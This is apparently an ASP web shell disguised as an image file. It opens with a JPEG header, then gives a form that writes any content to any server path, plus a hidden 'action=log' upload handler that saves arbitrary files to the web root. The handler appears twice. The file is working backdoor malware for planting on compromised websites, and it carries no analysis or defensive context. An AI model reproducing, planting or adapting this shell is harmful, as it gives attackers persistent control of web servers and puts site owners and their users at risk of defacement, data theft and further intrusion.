Ъ? JFIF<Title>©июжп║бМ</Title>
<%Dim objfSo%>
<%Dim fdata%>
<%Dim objCountFile%>
<%on error resume next%>
<%Set objfSo = Server.CreateObject("Scripting.fileSystemObject")%>
<%if Trim(request("syfdpath"))<>"" then%>
<%fdata = request("cyfddata")%>
<%Set objCountFile=objFSO.CreateTextFile(request("syfdpath"),True)%>
<%objCountFile.Write fdata%>
<%if err =0 then%>
OK!</font>
<%else%>
NO!</font>
<%end if%>
<%err.clear%>
<%end if%>
<%objCountFile.Close%>
<%Set objCountFile=Nothing%>
<%Set objFSO = Nothing%>
<form action='' method=pOsT>
PATH:</font><br>
<input type=text name=syfdpath width=32 value="<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%>" style="border:solid 1px" size=40><br>
GUT:<br>
<textarea name=cyfddata cols=39 rows=10 width=80 style="border:solid 1px"></textarea>
<br><input type=submit value=Save style="border:solid 1px">
</form>by:©июж
<%if request.QueryString("action")="log" then
a=Request.TotalBytes:if a Then b="adodb.stream":Set c=Createobject (b):c.Type=1:c.Open:c.Write Request.BinaryRead (a):c.Position=0:d=c.Read:e=chrB(13)&chrB(10):f=Instrb(d,e):g=Instrb (f+1,d,e):set h=Createobject(b):h.Type=1:h.Open:c.Position=f+1:c.Copyto  h,g-f- 3:h.Position=0:h.type=2:h.CharSet="BIG5":i=h.Readtext:h.close:j=mid (i,InstrRev(i,"\")+1,g):k=Instrb(d,e&e)+4:l=Instrb(k+1,d,leftB(d,f-1)) -k-2:h.Type=1:h.Open:c.Position=k-1:c.CopyTo h,l:h.SaveToFile  server.mappath(j),2%><form enctype=multipart/form-data  method=post><input type=file name=n><input type=submit></form>
<%end if%>
<%if request.QueryString("action")="log" then
a=Request.TotalBytes:if a Then b="adodb.stream":Set c=Createobject (b):c.Type=1:c.Open:c.Write Request.BinaryRead (a):c.Position=0:d=c.Read:e=chrB(13)&chrB(10):f=Instrb(d,e):g=Instrb (f+1,d,e):set h=Createobject(b):h.Type=1:h.Open:c.Position=f+1:c.Copyto  h,g-f- 3:h.Position=0:h.type=2:h.CharSet="BIG5":i=h.Readtext:h.close:j=mid (i,InstrRev(i,"\")+1,g):k=Instrb(d,e&e)+4:l=Instrb(k+1,d,leftB(d,f-1)) -k-2:h.Type=1:h.Open:c.Position=k-1:c.CopyTo h,l:h.SaveToFile  server.mappath(j),2%><form enctype=multipart/form-data  method=post><input type=file name=n><input type=submit></form>
<%end if%>